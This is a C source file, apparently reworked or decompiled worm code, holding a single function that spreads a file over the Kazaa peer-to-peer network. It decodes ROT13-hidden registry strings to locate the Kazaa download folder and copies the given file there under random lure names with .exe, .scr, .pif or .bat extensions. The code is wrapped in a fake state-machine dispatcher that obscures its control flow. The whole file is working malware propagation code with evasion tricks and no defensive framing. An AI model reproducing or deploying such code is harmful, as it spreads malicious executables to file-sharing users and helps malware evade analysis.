#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

#pragma optimize("", off)
void kazaa_spread(LPCSTR param_1)
{
    char local_158[64];
    char local_178[32];
    HKEY local_118;
    DWORD local_114 = 256;
    BYTE local_110[256];
    int iVar4;
    int names_count;
    DWORD DVar2;
    LSTATUS LVar3;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 7) goto dummy_state_7;
    if (dummy_state == 8) goto dummy_state_8;
    if (dummy_state == 9) goto dummy_state_9;
    if (dummy_state == 10) goto dummy_state_10;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    DVar2 = GetTickCount();
    srand(DVar2);
    names_count = KAZAA_NAMES_COUNT;
    memset(local_158, 0, sizeof(local_158));
    memset(local_178, 0, sizeof(local_178));
    _CiphStr((char *)local_158, "Fbsgjner\\Xnmnn\\Genafsre");
    _CiphStr((char *)local_178, "QyQve0");
    memset(local_110, 0, local_114);
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    LVar3 = RegOpenKeyExA(HKEY_CURRENT_USER, (const char *)local_158, 0, KEY_QUERY_VALUE, &local_118);
    if (LVar3 != 0) {
        dummy_state = 0;
        goto dummy_dispatcher;
    }
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    LVar3 = RegQueryValueExA(local_118, (const char *)local_178, NULL, NULL, local_110, &local_114);
    if (LVar3 != 0) {
        RegCloseKey(local_118);
        dummy_state = 0;
        goto dummy_dispatcher;
    }
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    RegCloseKey(local_118);
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    if (local_110[0] == '\0') {
        dummy_state = 0;
        goto dummy_dispatcher;
    }
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_6:
    iVar4 = strlen((char *)local_110);
    if (local_110[iVar4 - 1] == '/') {
        local_110[iVar4 - 1] = '\\';
    }
    dummy_state = 7;
    goto dummy_dispatcher;

dummy_state_7:
    iVar4 = strlen((char *)local_110);
    if (local_110[iVar4 - 1] != '\\') {
        local_110[iVar4] = '\\';
        local_110[iVar4 + 1] = '\0';
    }
    dummy_state = 8;
    goto dummy_dispatcher;

dummy_state_8:
    iVar4 = rand();
    strcpy((char *)(local_110 + strlen((char *)local_110)), kazaa_names[iVar4 % names_count]);
    strcat((char *)local_110, ".");
    iVar4 = rand() % 6;
    dummy_state = 9;
    goto dummy_dispatcher;

dummy_state_9:
    if (iVar4 == 0 || iVar4 == 1) {
        strcat((char *)local_110, "ex");
        strcat((char *)local_110, "e");
    } else if (iVar4 == 2 || iVar4 == 3) {
        strcat((char *)local_110, "sc");
        strcat((char *)local_110, "r");
    } else if (iVar4 == 4) {
        strcat((char *)local_110, "pi");
        strcat((char *)local_110, "f");
    } else {
        strcat((char *)local_110, "ba");
        strcat((char *)local_110, "t");
    }
    dummy_state = 10;
    goto dummy_dispatcher;

dummy_state_10:
    CopyFileA(param_1, (LPCSTR)local_110, TRUE);
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
